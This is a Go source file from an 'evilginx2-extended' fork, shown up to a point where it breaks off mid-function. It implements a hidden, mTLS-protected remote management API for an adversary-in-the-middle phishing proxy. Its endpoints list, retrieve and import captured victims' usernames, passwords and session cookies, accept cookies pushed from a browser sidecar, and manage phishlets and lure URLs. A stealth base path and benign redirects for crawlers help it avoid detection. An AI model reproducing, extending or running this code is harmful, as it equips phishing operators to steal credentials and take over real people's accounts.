package core

// apid.go — evilginx2-extended: HTTPS REST API with client-certificate auth.
// Parity with Evilginx Pro "Evilginx API" (stealth channel + client cert):
// - separate HTTPS listener, bound to server bind IP
// - mTLS: server requires a client certificate signed by the local API CA
// - stealth base path (random, persisted) — requests outside it get 404
// - endpoints: /status, /sessions, /sessions/{id}
// Fully offline: all certs generated locally, no ACME, no external calls.

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const apiStealthLen = 12

const phishletYAMLMax = 256 << 10

var phishletNameRe = regexp.MustCompile(`^[a-zA-Z0-9.-]{1,128}$`)

// apiVersion is the management contract version. Delivery refuses nodes below
// its supported minimum; bump only on breaking changes.
const apiVersion = "1"

// apiFeatures advertises what this build can do. Delivery gates provisioning on
// the subset it needs.
var apiFeatures = []string{
	"health",
	"lures.create",
	"lures.update",
	"lures.delete",
	"lures.list",
	"lures.external_ref",
	"status.details",
	"phishlets.list",
	"phishlets.push",
	"sessions.list",
	"sessions.completed",
}

func writeApiErr(w http.ResponseWriter, status int, code string, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(map[string]string{"code": code, "message": message})
}

type apiMeta struct {
	BasePath string `json:"base_path"`
}

func apiSerial() *big.Int {
	limit := new(big.Int).Lsh(big.NewInt(1), 128)
	n, _ := rand.Int(rand.Reader, limit)
	return n
}

func apiCertTemplate(cn string, isCA bool, ips []net.IP) *x509.Certificate {
	t := &x509.Certificate{
		SerialNumber:          apiSerial(),
		Subject:               pkix.Name{CommonName: cn, Organization: []string{"evilginx2-extended"}},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}
	if isCA {
		t.IsCA = true
		t.KeyUsage |= x509.KeyUsageCertSign
	}
	if len(ips) > 0 {
		t.IPAddresses = ips
		t.DNSNames = []string{"localhost"}
	}
	return t
}

func apiWritePem(path string, typ string, der []byte) error {
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer f.Close()
	return pem.Encode(f, &pem.Block{Type: typ, Bytes: der})
}

func apiGenCert(cn string, isCA bool, ips []net.IP, caCert *x509.Certificate, caKey *rsa.PrivateKey) (*x509.Certificate, *rsa.PrivateKey, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	tpl := apiCertTemplate(cn, isCA, ips)
	if isCA {
		caCert, caKey = tpl, key
	}
	der, err := x509.CreateCertificate(rand.Reader, tpl, caCert, &key.PublicKey, caKey)
	if err != nil {
		return nil, nil, err
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return nil, nil, err
	}
	return cert, key, nil
}

type apiServer struct {
	db        *database.Database
	cfg       *Config
	px        *HttpProxy
	base      string
	phishletM sync.Mutex
}

func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int, dir string) {
	if err := os.MkdirAll(dir, 0700); err != nil {
		log.Error("api: %v", err)
		return
	}

	metaPath := filepath.Join(dir, "config.json")
	var meta apiMeta
	if b, err := os.ReadFile(metaPath); err == nil {
		if json.Unmarshal(b, &meta) != nil || len(meta.BasePath) < 4 {
			meta.BasePath = ""
		}
	}
	if meta.BasePath == "" {
		meta.BasePath = "/api-" + GenRandomString(apiStealthLen)
		if b, err := json.MarshalIndent(meta, "", "  "); err == nil {
			os.WriteFile(metaPath, b, 0600)
		}
	}

	caCertPath := filepath.Join(dir, "ca.crt")
	caKeyPath := filepath.Join(dir, "ca.key")
	srvCertPath := filepath.Join(dir, "server.crt")
	srvKeyPath := filepath.Join(dir, "server.key")
	cliCertPath := filepath.Join(dir, "client.crt")
	cliKeyPath := filepath.Join(dir, "client.key")

	// CA: load or create
	var caCert *x509.Certificate
	var caKey *rsa.PrivateKey
	if _, err := os.Stat(caCertPath); err == nil {
		cb, err := os.ReadFile(caCertPath)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		block, _ := pem.Decode(cb)
		if block == nil {
			log.Error("api: bad CA pem")
			return
		}
		caCert, err = x509.ParseCertificate(block.Bytes)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		kb, _ := os.ReadFile(caKeyPath)
		kblock, _ := pem.Decode(kb)
		caKey, err = x509.ParsePKCS1PrivateKey(kblock.Bytes)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
	} else {
		caCert, caKey, err = apiGenCert("evilginx2-api-ca", true, nil, nil, nil)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		if err := apiWritePem(caCertPath, "CERTIFICATE", caCert.Raw); err != nil {
			log.Error("api: %v", err)
			return
		}
		if err := apiWritePem(caKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(caKey)); err != nil {
			log.Error("api: %v", err)
			return
		}
	}

	// server + client certs: always (re)issue if missing
	// The external IP must be in the SAN: the API is reached from another host
	// by that address even when bind_ipv4 is empty (wildcard bind).
	srvIPs := []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	for _, raw := range []string{cfg.GetServerBindIP(), cfg.GetServerExternalIP()} {
		ip := net.ParseIP(raw)
		if ip == nil {
			continue
		}
		seen := false
		for _, have := range srvIPs {
			if have.Equal(ip) {
				seen = true
				break
			}
		}
		if !seen {
			srvIPs = append(srvIPs, ip)
		}
	}
	srvCert, srvKey, err := apiGenCert("evilginx2-api-server", false, srvIPs, caCert, caKey)
	if err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(srvCertPath, "CERTIFICATE", srvCert.Raw); err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(srvKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(srvKey)); err != nil {
		log.Error("api: %v", err)
		return
	}
	cliCert, cliKey, err := apiGenCert("evilginx2-api-client", false, nil, caCert, caKey)
	if err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(cliCertPath, "CERTIFICATE", cliCert.Raw); err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(cliKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(cliKey)); err != nil {
		log.Error("api: %v", err)
		return
	}

	clientCAPool := x509.NewCertPool()
	clientCAPool.AddCert(caCert)
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{{
			Certificate: [][]byte{srvCert.Raw},
			PrivateKey:  srvKey,
		}},
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  clientCAPool,
		MinVersion: tls.VersionTLS12,
	}

	a := &apiServer{db: db, cfg: cfg, px: hp, base: meta.BasePath}
	mux := http.NewServeMux()
	mux.HandleFunc(a.base+"/healthz", a.handleHealth)
	mux.HandleFunc(a.base+"/status", a.handleStatus)
	mux.HandleFunc(a.base+"/capabilities", a.handleCapabilities)
	mux.HandleFunc(a.base+"/sessions", a.handleSessions)
	mux.HandleFunc(a.base+"/sessions/", a.handleSessionDetail)
	mux.HandleFunc(a.base+"/sessions/import", a.handleSessionImport)
	mux.HandleFunc(a.base+"/phishlets", a.handlePhishlets)
	mux.HandleFunc(a.base+"/phishlets/", a.handlePhishletAction)
	mux.HandleFunc(a.base+"/proxy", a.handleProxyCfg)
	mux.HandleFunc(a.base+"/lures", a.handleLures)
	mux.HandleFunc(a.base+"/lures/", a.handleLureUrl)
	mux.HandleFunc(a.base+"/pp/cookies", a.handlePuppetCookies)
	mux.HandleFunc(a.base+"/phishlets/reload", a.handlePhishletReload)

	srv := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), port),
		Handler:      mux,
		TLSConfig:    tlsCfg,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	log.Info("api: listening on https://%s:%d%s (mTLS, client cert: %s)", cfg.GetServerBindIP(), port, a.base, cliCertPath)
	if err := srv.ListenAndServeTLS("", ""); err != nil {
		log.Error("api: %v", err)
	}
}

func (a *apiServer) handleHealth(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" && r.Method != "HEAD" {
		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET required")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

func (a *apiServer) handleCapabilities(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"api_version": apiVersion,
		"features":    apiFeatures,
		"limits": map[string]int{
			"lures":               4096,
			"page_size":           200,
			"phishlet_yaml_bytes": phishletYAMLMax,
		},
	})
}

func (a *apiServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	phishlets := make(map[string]map[string]interface{})
	hostnames := make(map[string]string)
	certs := make(map[string]map[string]interface{})
	for _, name := range a.cfg.GetPhishletNames() {
		pc := a.cfg.PhishletConfig(name)
		pl, err := a.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		// TLS is issued for the phish hosts (phish_sub.site_hostname), not for
		// the bare site hostname, so readiness is tracked per phish host.
		landing := pl.GetLandingPhishHost()
		phishlets[name] = map[string]interface{}{
			"enabled":  pc.Enabled,
			"hidden":   !pc.Visible,
			"hostname": landing,
		}
		if landing == "" {
			continue
		}
		hostnames[name] = landing
		for _, host := range append(pl.GetPhishHosts(false), landing) {
			if _, done := certs[host]; done {
				continue
			}
			ready, expires := false, int64(0)
			if a.px != nil && a.px.crt_db != nil {
				ready, expires = a.px.crt_db.certStatus(host)
			}
			certs[host] = map[string]interface{}{
				"ready":     ready,
				"not_after": expires,
			}
		}
	}
	sessions := 0
	detonators := int64(0)
	if a.px != nil {
		sessions = len(a.px.sessions)
		detonators = a.px.BotguardDetCount()
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":      "ok",
		"version":     BatteriesBuild,
		"api_version": apiVersion,
		"time":        time.Now().Unix(),
		"detonators":  detonators,
		"load":        map[string]interface{}{"sessions_active": sessions},
		"phishlets":   phishlets,
		"hostnames":   hostnames,
		"certs":       certs,
	})
}

// handleProxyCfg — GET: proxy status (password masked). POST: full config
// {enabled,type,address,port,username,password,routes[]} — applies live via
// setProxy and persists to config.json.
func (a *apiServer) handleProxyCfg(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method == "GET" {
		pc := a.cfg.proxyConfig
		pw := ""
		if pc.Password != "" {
			pw = strings.Repeat("*", len(pc.Password))
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"enabled": pc.Enabled, "type": pc.Type, "address": pc.Address,
			"port": pc.Port, "username": pc.Username, "password": pw,
			"routes": pc.Routes, "tlsfp": pc.TLSFingerprint,
		})
		return
	}
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	// partial update: pointer fields — omitted keys keep their current value
	// (GET returns a MASKED password, so echoing it back must not clobber it)
	var req struct {
		Enabled        *bool     `json:"enabled"`
		Type           *string   `json:"type"`
		Address        *string   `json:"address"`
		Port           *int      `json:"port"`
		Username       *string   `json:"username"`
		Password       *string   `json:"password"`
		Routes         *[]string `json:"routes"`
		TLSFingerprint *string   `json:"tlsfp"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"bad json body"}`, http.StatusBadRequest)
		return
	}
	pc := a.cfg.proxyConfig
	if req.Type != nil {
		pc.Type = *req.Type
	}
	if req.Address != nil {
		pc.Address = *req.Address
	}
	if req.Port != nil {
		pc.Port = *req.Port
	}
	if req.Username != nil {
		pc.Username = *req.Username
	}
	if req.Password != nil {
		pc.Password = *req.Password
	}
	a.cfg.SaveProxyConfig() // sync + persist direct field assignments (type/address/port/creds)
	if req.Routes != nil {
		a.cfg.SetProxyRoutes(*req.Routes)
	}
	if req.TLSFingerprint != nil {
		a.cfg.proxyConfig.TLSFingerprint = strings.ToLower(*req.TLSFingerprint)
		a.cfg.SaveProxyConfig()
	}
	if req.Enabled != nil {
		a.cfg.EnableProxy(*req.Enabled)
	}
	enabled := a.cfg.proxyConfig.Enabled
	if err := a.px.setProxy(enabled, pc.Type, pc.Address, pc.Port, pc.Username, pc.Password); err != nil {
		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	pw := ""
	if pc.Password != "" {
		pw = strings.Repeat("*", len(pc.Password))
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ok": true, "enabled": enabled, "routes": pc.Routes, "tlsfp": pc.TLSFingerprint, "password": pw,
	})
}

func (a *apiServer) handleSessions(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	filter := database.SessionFilter{
		Phishlet: q.Get("phishlet"),
		Lure:     q.Get("lure"),
		Limit:    200,
	}
	if raw := q.Get("since"); raw != "" {
		if since, err := strconv.ParseInt(raw, 10, 64); err == nil && since > 0 {
			filter.SinceID = since
		}
	}
	if raw := q.Get("limit"); raw != "" {
		if limit, err := strconv.Atoi(raw); err == nil && limit > 0 {
			if limit > 1000 {
				limit = 1000
			}
			filter.Limit = limit
		}
	}
	sessions, err := a.db.ListSessionsFiltered(filter)
	if err != nil {
		writeApiErr(w, http.StatusInternalServerError, "list_failed", err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (a *apiServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Path[len(a.base)+len("/sessions/"):]
	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, `{"error":"bad session id"}`, http.StatusBadRequest)
		return
	}
	if r.Method == "DELETE" {
		if err := a.db.DeleteSessionById(id); err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"deleted": idStr})
		return
	}
	s, err := a.db.GetSessionById(id)
	if err != nil {
		http.Error(w, `{"error":"not found"}`, http.StatusNotFound)
		return
	}
	// enrich with the phishlet's reopen_url so `open <id>` can default to the
	// right landing page (mailbox) instead of a generic office.com
	if pl, err := a.cfg.GetPhishlet(s.Phishlet); err == nil && pl != nil {
		s.ReopenUrl = pl.ReopenUrl
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s)
}

// handleSessionImport — POST /sessions/import (mTLS): create a session row
// from a relay capture so it appears in the session list with cookies.
// Body: {"phishlet","session_id","username","password","cookies":[{name,value,domain,path}],
//
//	"useragent","landing_url"}
func (a *apiServer) handleSessionImport(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST only"}`, http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Phishlet  string `json:"phishlet"`
		SessionId string `json:"session_id"`
		Username  string `json:"username"`
		Password  string `json:"password"`
		Cookies   []struct {
			Name   string `json:"name"`
			Value  string `json:"value"`
			Domain string `json:"domain"`
			Path   string `json:"path"`
		} `json:"cookies"`
		UserAgent  string `json:"useragent"`
		LureId     string `json:"lure_id"`
		LandingURL string `json:"landing_url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeApiErr(w, http.StatusBadRequest, "invalid_body", "bad body")
		return
	}
	if req.Phishlet == "" || req.SessionId == "" {
		writeApiErr(w, http.StatusBadRequest, "invalid_body", "phishlet and session_id are required")
		return
	}
	// create the session row
	if err := a.db.CreateSession(req.SessionId, req.Phishlet, req.LureId, req.LandingURL,
		req.UserAgent, "relay-import"); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusConflict)
		return
	}
	if req.Username != "" {
		a.db.SetSessionUsername(req.SessionId, req.Username)
	}
	if req.Password != "" {
		a.db.SetSessionPassword(req.SessionId, req.Password)
	}
	// merge cookies into CookieTokens (domain -> name -> token)
	if len(req.Cookies) > 0 {
		tokens := make(map[string]map[string]*database.CookieToken)
		for _, c := range req.Cookies {
			if c.Domain == "" || c.Name == "" {
				continue
			}
			if tokens[c.Domain] == nil {
				tokens[c.Domain] = make(map[string]*database.CookieToken)
			}
			path := c.Path
			if path == "" {
				path = "/"
			}
			tokens[c.Domain][c.Name] = &database.CookieToken{
				Name:  c.Name,
				Value: c.Value,
				Path:  path,
			}
		}
		a.db.SetSessionCookieTokens(req.SessionId, tokens)
	}
	log.Info("api: relay capture imported as session %s (%s, %d cookies)",
		req.SessionId, req.Username, len(req.Cookies))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"result": "imported", "session_id": req.SessionId})
}

func (a *apiServer) handlePhishlets(w http.ResponseWriter, r *http.Request) {
	out := []map[string]interface{}{}
	for _, n := range a.cfg.GetPhishletNames() {
		entry := map[string]interface{}{
			"name":    n,
			"enabled": a.cfg.IsSiteEnabled(n),
			"hidden":  a.cfg.IsSiteHidden(n),
		}
		if pl, err := a.cfg.GetPhishlet(n); err == nil && pl != nil {
			entry["site_url"] = pl.OriginUrl()
		}
		out = append(out, entry)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func (a *apiServer) handlePhishletReload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	rep, err := a.cfg.ReloadPhishlets(a.cfg.PhishletsDir)
	if err != nil {
		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	if a.px != nil {
		a.px.RefreshCerts()
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(rep)
}

func (a *apiServer) handlePhishletAction(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, a.base+"/phishlets/"), "/")
	if len(parts) == 1 && parts[0] != "" {
		a.handlePhishletItem(w, r, parts[0])
		return
	}
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	if len(parts) != 2 {
		writeApiErr(w, http.StatusBadRequest, "invalid_path", "expected /phishlets/{name}/{enable|disable|hostname}")
		return
	}
	name, action := parts[0], parts[1]
	var err error
	switch action {
	case "enable":
		err = a.cfg.SetSiteEnabled(name)
	case "disable":
		err = a.cfg.SetSiteDisabled(name)
	case "hide":
		err = a.cfg.SetSiteHidden(name, true)
	case "unhide":
		err = a.cfg.SetSiteHidden(name, false)
	case "hostname":
		var req struct {
			Hostname string `json:"hostname"`
		}
		if e := json.NewDecoder(r.Body).Decode(&req); e != nil || req.Hostname == "" {
			http.Error(w, `{"error":"body must be {"hostname": "..."}"}`, http.StatusBadRequest)
			return
		}
		if !a.cfg.SetSiteHostname(name, req.Hostname) {
			writeApiErr(w, http.StatusUnprocessableEntity, "hostname_failed", "failed to set hostname")
			return
		}
	default:
		writeApiErr(w, http.StatusNotFound, "unknown_action", "unknown action")
		return
	}
	if err != nil {
		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	// Enable/hostname change must re-provision TLS, exactly like the console
	// command; run it off the request path.
	if action != "disable" && a.px != nil {
		go a.px.RefreshCerts()
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"result": action + " " + name + " ok"})
}

// handlePhishletItem serves the phishlet source: GET reads it, PUT validates and
// replaces it atomically, DELETE removes it. "reload" stays reserved for the
// explicit reload endpoint.
func (a *apiServer) handlePhishletItem(w http.ResponseWriter, r *http.Request, name string) {
	if r.Method != "GET" && r.Method != "PUT" && r.Method != "DELETE" {
		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET, PUT or DELETE required")
		return
	}
	if name == "reload" || !phishletNameRe.MatchString(name) {
		writeApiErr(w, http.StatusBadRequest, "invalid_name", "invalid or reserved phishlet name")
		return
	}
	if a.cfg.PhishletsDir == "" {
		writeApiErr(w, http.StatusConflict, "no_phishlets_dir", "phishlets directory is not configured")
		return
	}
	path := filepath.Join(a.cfg.PhishletsDir, name+".yaml")

	switch r.Method {
	case "GET":
		b, err := os.ReadFile(path)
		if err != nil {
			if os.IsNotExist(err) {
				writeApiErr(w, http.StatusNotFound, "phishlet_not_found", "phishlet not found")
				return
			}
			writeApiErr(w, http.StatusInternalServerError, "read_failed", err.Error())
			return
		}
		w.Header().Set("Content-Type", "application/x-yaml")
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		_, _ = w.Write(b)
	case "PUT":
		a.phishletM.Lock()
		defer a.phishletM.Unlock()

		r.Body = http.MaxBytesReader(w, r.Body, phishletYAMLMax)
		b, err := io.ReadAll(r.Body)
		if err != nil {
			var tooBig *http.MaxBytesError
			if errors.As(err, &tooBig) {
				writeApiErr(w, http.StatusRequestEntityTooLarge, "too_large", "phishlet YAML exceeds 256 KiB")
				return
			}
			writeApiErr(w, http.StatusBadRequest, "invalid_body", err.Error())
			return
		}
		if len(strings.TrimSpace(string(b))) == 0 {
			writeApiErr(w, http.StatusUnprocessableEntity, "invalid_yaml", "empty phishlet YAML")
			return
		}

		tmp, err := os.CreateTemp(a.cfg.PhishletsDir, ".phishlet-*")
		if err != nil {
			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
			return
		}
		tmpPath := tmp.Name()
		defer os.Remove(tmpPath)
		if err := tmp.Chmod(0600); err != nil {
			tmp.Close()
			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
			return
		}
		if _, err := tmp.Write(b); err != nil {
			tmp.Close()
			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
			return
		}
		if err := tmp.Close(); err != nil {
			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
			return
		}
		if _, err := NewPhishlet(name, tmpPath, nil, a.cfg); err != nil {
			writeApiErr(w, http.StatusUnprocessableEntity, "invalid_yaml", err.Error())
			return
		}

		_, statErr := os.Stat(path)
		created := os.IsNotExist(statErr)
		if err := os.Rename(tmpPath, path); err != nil {
			writeApiErr(w, http.StatusInternalServerError, "write_failed", err.Error())
			return
		}
		if _, err := a.cfg.ReloadPhishlets(""); err != nil {
			writeApiErr(w, http.StatusInternalServerError, "reload_failed", err.Error())
			return
		}
		if a.px != nil {
			go a.px.RefreshCerts()
		}
		status := http.StatusOK
		if created {
			status = http.StatusCreated
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(status)
		json.NewEncoder(w).Encode(map[string]interface{}{"result": "put " + name + " ok", "created": created})
	case "DELETE":
		a.phishletM.Lock()
		defer a.phishletM.Unlock()

		if err := os.Remove(path); err != nil {
			if os.IsNotExist(err) {
				writeApiErr(w, http.StatusNotFound, "phishlet_not_found", "phishlet not found")
				return
			}
			writeApiErr(w, http.StatusInternalServerError, "delete_failed", err.Error())
			return
		}
		if _, err := a.cfg.ReloadPhishlets(""); err != nil {
			writeApiErr(w, http.StatusInternalServerError, "reload_failed", err.Error())
			return
		}
		if a.px != nil {
			go a.px.RefreshCerts()
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"deleted": name})
	}
}

// lureView renders a lure for the management API, optionally with its URL.
func lureView(cfg *Config, l *Lure, withURL bool) map[string]interface{} {
	view := map[string]interface{}{
		"id": l.Id, "phishlet": l.Phishlet, "path": l.Path,
		"hostname": l.Hostname, "redirect_url": l.RedirectUrl,
		"token": l.Token, "relay": l.Relay,
		"external_ref": l.ExternalRef,
		"paused":       l.PausedUntil != 0,
		"redirector":   l.Redirector,
		"ua_filter":    l.UserAgentFilter,
		"info":         l.Info,
		"og_title":     l.OgTitle,
		"og_desc":      l.OgDescription,
		"og_image":     l.OgImageUrl,
		"og_url":       l.OgUrl,
	}
	if withURL {
		values := url.Values{}
		if built, err := lureUrlFor(cfg, l, values); err == nil {
			view["url"] = built
		}
	}
	return view
}

func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		phishletFilter := r.URL.Query().Get("phishlet")
		refFilter := r.URL.Query().Get("external_ref")
		out := []map[string]interface{}{}
		for i := 0; i < 4096; i++ {
			l, err := a.cfg.GetLure(i)
			if err != nil {
				break
			}
			if phishletFilter != "" && l.Phishlet != phishletFilter {
				continue
			}
			if refFilter != "" && l.ExternalRef != refFilter {
				continue
			}
			out = append(out, lureView(a.cfg, l, true))
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(out)
		return
	}
	if r.Method != "POST" {
		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "POST required")
		return
	}
	var req struct {
		Phishlet    string `json:"phishlet"`
		Path        string `json:"path"`
		RedirectUrl string `json:"redirect_url"`
		Token       string `json:"token"`
		Relay       bool   `json:"relay"`
		ExternalRef string `json:"external_ref"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Phishlet == "" {
		writeApiErr(w, http.StatusBadRequest, "invalid_body", `body must be {"phishlet": "..."}`)
		return
	}
	pl, err := a.cfg.GetPhishlet(req.Phishlet)
	if err != nil {
		writeApiErr(w, http.StatusUnprocessableEntity, "invalid_phishlet", "unknown phishlet")
		return
	}
	hostname := pl.GetLandingPhishHost()
	if hostname == "" {
		writeApiErr(w, http.StatusUnprocessableEntity, "hostname_missing", "phishlet hostname is not set")
		return
	}
	if a.px != nil && a.px.crt_db != nil {
		if ready, _ := a.px.crt_db.certStatus(hostname); !ready {
			writeApiErr(w, http.StatusLocked, "cert_not_ready", "phishlet hostname certificate is not ready")
			return
		}
	}
	if req.ExternalRef != "" {
		for _, existing := range a.cfg.lures {
			if existing.ExternalRef == req.ExternalRef {
				writeApiErr(w, http.StatusConflict, "external_ref_taken", "external_ref is already in use")
				return
			}
		}
	}
	if req.Path != "" {
		for _, existing := range a.cfg.lures {
			if existing.Phishlet == req.Phishlet && existing.Path == req.Path {
				writeApiErr(w, http.StatusConflict, "path_taken", "path is already used by this phishlet")
				return
			}
		}
	}
	l := &Lure{
		Phishlet:    req.Phishlet,
		Path:        req.Path,
		RedirectUrl: req.RedirectUrl,
		Relay:       req.Relay,
		ExternalRef: req.ExternalRef,
	}
	switch req.Token {
	case "":
		// no token gate — bare lure URLs open the login flow
	case "auto":
		l.Token = GenRandomString(16)
	default:
		l.Token = req.Token
	}
	if l.Token != "" && l.RedirectUrl == "" {
		// gated lures need somewhere benign to send crawlers
		l.RedirectUrl = "https://www.office.com"
	}
	if l.Path == "" {
		l.Path = "/" + GenRandomString(8)
	}
	a.cfg.AddLure(req.Phishlet, l)
	built, err := lureUrlFor(a.cfg, l, r.URL.Query())
	if err != nil {
		log.Error("api: lure url: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"id": l.Id, "path": l.Path, "token": l.Token, "url": built,
	})
}

// resolveLure addresses lures by their stable id. Numeric indices are no longer
// accepted: the contract is id-only.
func (a *apiServer) resolveLure(raw string) (*Lure, error) {
	return a.cfg.GetLureById(raw)
}

func lureUrlFor(cfg *Config, l *Lure, params url.Values) (string, error) {
	pl, err := cfg.GetPhishlet(l.Phishlet)
	if err != nil {
		return "", fmt.Errorf("phishlet not found")
	}
	var base string
	if l.Hostname != "" {
		base = "https://" + l.Hostname + l.Path
	} else {
		purl, err := pl.GetLureUrl(l.Path)
		if err != nil {
			return "", err
		}
		base = purl
	}
	return BuildLureUrl(cfg, WithLureToken(base, l.Token), &params), nil
}

func (a *apiServer) handleLureUrl(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, a.base+"/lures/")
	if !strings.HasSuffix(rest, "/url") {
		a.handleLureItem(w, r, rest)
		return
	}
	l, err := a.resolveLure(strings.TrimSuffix(rest, "/url"))
	if err != nil {
		writeApiErr(w, http.StatusNotFound, "lure_not_found", "lure not found")
		return
	}
	built, err := lureUrlFor(a.cfg, l, r.URL.Query())
	if err != nil {
		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"url": built})
}

type ppCookieIn struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	Domain   string `json:"domain"`
	HttpOnly bool   `json:"http_only"`
}

// handlePuppetCookies — evilpuppet sidecar pushes browser cookies for a
// live session (Pro "Evilpuppet" v1: real-browser session enrichment).
func (a *apiServer) handlePuppetCookies(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		SessionToken string       `json:"session_token"`
		Phishlet     string       `json:"phishlet"`
		Cookies      []ppCookieIn `json:"cookies"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionToken == "" {
		http.Error(w, `{"error":"bad payload"}`, http.StatusBadRequest)
		return
	}
	if err := a.px.ImportPuppetCookies(req.SessionToken, req.Phishlet, req.Cookies); err != nil {
